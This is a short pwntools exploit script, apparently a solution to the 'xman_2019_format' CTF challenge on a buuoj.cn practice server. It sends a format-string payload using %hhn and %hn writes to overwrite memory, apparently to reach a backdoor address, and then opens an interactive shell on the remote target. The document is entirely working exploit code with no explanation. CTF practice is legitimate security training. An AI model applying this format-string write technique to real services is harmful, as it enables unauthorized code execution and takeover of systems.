from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('xman_2019_format')
io = remote('node4.buuoj.cn', 25205)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.27.so')
elf = ELF('xman_2019_format')
backdoor = 0x080485AB
printf_got = elf.got['printf']

payload = b'%12c%10$hhn|%34219c%18$hn'
io.sendlineafter('...\n...\n', payload)
io.interactive()
